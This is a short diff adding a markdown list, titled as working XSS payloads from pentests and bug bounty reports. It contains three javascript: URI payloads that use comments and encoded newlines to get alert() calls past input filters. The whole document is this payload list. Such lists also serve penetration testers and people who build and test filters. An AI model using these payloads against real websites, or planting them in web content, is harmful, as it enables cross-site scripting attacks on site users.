@@ -1,0 +1,5 @@
+## Some working XSS payloads from pentests and bug bounty reports 
+
+- javascript://%0dalert() 
+- javascript:/**/%0aalert()
+- javascript://%0aalert(1)
